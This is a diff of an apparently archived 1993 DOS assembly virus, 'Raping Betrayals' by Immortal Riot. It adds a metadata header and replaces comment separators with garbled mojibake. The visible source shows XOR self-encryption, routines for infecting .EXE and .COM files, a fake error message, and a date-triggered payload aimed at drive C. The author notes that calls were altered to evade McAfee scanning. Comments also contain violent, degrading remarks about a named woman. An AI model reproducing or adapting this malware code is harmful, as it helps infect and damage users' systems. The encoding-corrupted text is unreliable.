@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      R
+; type      asm
+; cve       Б─■
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     Б─■
+; ------------------------------------------------------------
 ; VirusName: Raping Betrayals
 ; Country  : Sweden
 ; Author   : The Unforgiven / Immortal Riot
@@ -50,18 +61,18 @@ attribute       equ     21         ;  Offset in DTA of file attribute
         assume  cs:code,ds:code    ;  One segment for both code & data
                 org     code_start ;  Start code image after PSP
  
-; дд-дддддд-ддддддддддд--дддддддддддд--ддддддд--д-ддддддддддддд-ддддд-д
+; О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫-О©╫
 ;  All executable code is contained in boundaries of procedure "main".
 ;  The following code, until the start of "virus_code", is the non-
 ;  encrypted CMT portion of the code to load up the real program.
-; дд-ддддддддддд--дддддд-дддддддддддд--дддддддддддддддддддддддд-ддддд-д
+; О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫-О©╫
 main    proc    near                    ;  Code execution begins here
 
         call    encrypt_decrypt         ;  Decrypt the real virus code
         jmp     random_mutation         ;  Put the virus into action
 encrypt_val     db      00h             ;  Hold value to encrypt by here
  
-; д-ддд--дд-  Encrypt, save, and restore the virus code  ддд--дд--д-дд
+; О©╫-О©╫О©╫О©╫--О©╫О©╫-  Encrypt, save, and restore the virus code  О©╫О©╫О©╫--О©╫О©╫--О©╫-О©╫О©╫
 infect_file:
         mov     bx,handle            ;  Get the handle
         push    bx                   ;  Save it on the stack
@@ -77,7 +88,7 @@ infect_file:
      	call 	daycheck             ;  Call function who check's for day.  
         ret                          ;  Go back to where you came from
  
-;      дд-дддд-дд  Encrypt or decrypt the virus code ; дд-дддд--дддддд-д 
+;      О©╫О©╫-О©╫О©╫О©╫О©╫-О©╫О©╫  Encrypt or decrypt the virus code ; О©╫О©╫-О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫-О©╫ 
 
 encrypt_decrypt:
          mov     bx,offset virus_code   ;  Get address to start 
@@ -91,40 +102,40 @@ xor_loop:                               ;  Start cycle here
         jle     xor_loop                ;  If not, do another cycle
         ret                             ;  and go back where we came from
  
-; дд-ддддд---ддддд--ддд--ддд--ддддддд--ддддддд----ддддддддддддд-ддддд-д
+; О©╫О©╫-О©╫О©╫О©╫О©╫О©╫---О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫--О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫----О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫-О©╫
 ;   The rest of the code from here on remains encrypted until run-time,
 ;   using a fundamental XOR technique that changes via CMT.
-; дд-дддддд--д-дддддддд--ддд---дддддд--дддддддддддд--д-д-дддддд-ддддд-д
+; О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫--О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫---О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫-О©╫-О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫-О©╫
 virus_code:
  
-; дд-дддд--ддддддддддддд-дд--дддддддд--дддддд--дддддддддддддддд-ддддд-д
+; О©╫О©╫-О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫-О©╫
 ;  "All strings are kept here in the file, and automatically encrypted"
 ;  Okey..Thanks	to Cybernetic Mutation Technology(tm), for this, but
 ;  the virus is pretty un-use-less if Mcafee scan catch is so, I 
 ;  changed a few calls, and you can have phun with this again...
-; дд-дддд--дддддддддддд--дддддддддд-д--дддддддддддддддддддддддд-ддддд-д
+; О©╫О©╫-О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫-О©╫
 exe_filespec    db      "*.EXE",0 ; To infect EXE's
 com_filespec    db      "*.COM",0 ; To infect COM's
 newdir          db      "..",0    ; Move up one directory
-; дд-дддддддддддддддддд--дддддддддддд--дддддддддддддд--дддддддд-ддддд-д
+; О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫-О©╫
 ; Fake_msg is the message that will be printed on the screen, after
 ; it has infected files (or when a infected file is run).
-; дд-дддддддддддддддддд--дддддддддддд--дддддддддд---ддддддддддддддддд-д
+; О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫---О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫
 fake_msg     db cr,lf,"Program too big to fit in memory$"
 virus_msg1   db cr,lf,tab,"Betrayal is a sin, if it comes from another..$"
 	     db	" The Unforgiven / Immortal Riot " ; HUmm..that's me..
 	     db	" Dedicated to Ellie! - Lurve you! "; Love ya Ellie!
 	     db	" Sweden 15/09/93 "		    ; written..
-; дд-ддддддд----ддд-дддддд--дддддддддддд--дддддддддддддддд--дддддд-ддддд-д
+; О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫----О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫-О©╫
 ; Okey..these messages just are just "file-size out-fillers" or something,
 ; nothing important..so I remarked them, and the virus is a bit smaller...
-; also check in prodedure "Exit_virus" for more info about ┌m..
+; also check in prodedure "Exit_virus" for more info about О©╫m..
 
 ;virus_msg2  db  cr,lf,tab," Something was placed here before..     $"
 ;virus_msg3  db  cr,lf,tab," But now, it's all gone, black, sad      $"
 ;virus_msg4  db  cr,lf,tab," and empty. Empty places i my mind,      $"
 ;virus_msg5  db  cr,lf,tab," heart, life, and soul, yes, it's a sin. $"
-; дд-дддддддд---дддддддддд--дддддддддддд--ддддддддд--ддддддддддддд-ддддд-д
+; О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫---О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫-О©╫
 
 compare_buf     db      20 dup (?)      ;  Buffer to compare files in
 files_found     db      ?
@@ -248,7 +259,7 @@ close_file:
         int     21h
         ret			    ; Returning to base...
 
-; дд-ддддд-ддддд-дддддд--дддддддддддд--ддддддд-д--дддддд-дддддд-ддддд-д
+; О©╫О©╫-О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫--О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫-О©╫
 ; ELLIE:
 ;       mov     ah,09h                  ; Read under                 
 ;       mov     dx,offset virus_msg1	; for more              
@@ -259,9 +270,9 @@ close_file:
 ; you wanna check if the function day-check works, just un-mark
 ; the tree lines under the first "ellie". and the virus_msg1 
 ; "Betrayal is a sin, if it comes from another" will be	displayed.
-; дд-ддд-дддддддддддддд--дддддддддддд--ддддддд-ддддддд-дддддддд-ддддд-д
+; О©╫О©╫-О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫-О©╫
 ; Here is the real "Ellie"..Yeah..that's certainly her!		       
-; дд--ддддддддддддддддд--дддддддддддд--дддддддддддд--дддддддддд-ддддд-д
+; О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫-О©╫
 ELLIE:					; Here comes the bitch..
 	cli				; Tigh her up!      
 	mov	ah,2			; starting with drive C
@@ -278,7 +289,7 @@ MARIA:					;Yet another..
 	MOV	BX,[DI+55]		;More crap in BX
 	CALL	ELLIE			;Jump for joy!...
 
-; дд-ддд-дддддддддддддд--дддддддддддд--ддддддд-ддддддд-дддддддд-ддддд-дддд-
+; О©╫О©╫-О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫-
 ; If you want Ellie to go off on some special month, just look at procedure
 ; "Infect_file", and the call to daycheck. Change the call to Monthcheck,
 ; and "delete" the ";" on procedure monthcheck. But remember, that makes,
@@ -292,7 +303,7 @@ MARIA:					;Yet another..
 ;  	cmp dh,06  	 ; comp dh,06 (July, month 06)
 ;	je  daycheck	 ; if month 06, jump to daycheck,
 ; 	JMP something 	 ; if not, just jump to something..
-; дд-ддд-дддддддддддддд--дддддддддддд--ддддддд-ддддддд-дддддддд-ддддд-дддд-
+; О©╫О©╫-О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫-
 
 Daycheck:		 ; check what day it is..
 	mov ah,2ah	 ;
